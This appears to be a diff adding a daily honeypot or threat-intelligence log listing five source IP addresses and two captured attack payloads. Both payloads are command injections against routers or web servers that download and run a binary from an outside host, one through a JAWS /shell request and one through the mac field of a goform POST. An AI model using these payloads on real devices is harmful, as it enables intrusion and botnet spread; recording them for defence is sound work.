@@ -1,0 +1,19 @@
+Top 5 IPs for 2024-03-26 :
+
+222.103.33.79
+112.162.27.196
+112.184.17.71
+119.199.134.205
+121.140.239.217
+
+Malcious Commands seen:
+
+/shell?cd+/tmp;+rm+-rf+shk;+wget+http:/\\/89.190.156.173/shk;+chmod+777+shk;+./shk+jaws;+rm+-rf+shk
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *mpsl*;wget http://14.225.208.190/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm -rf *mpsl*;
+
+
+
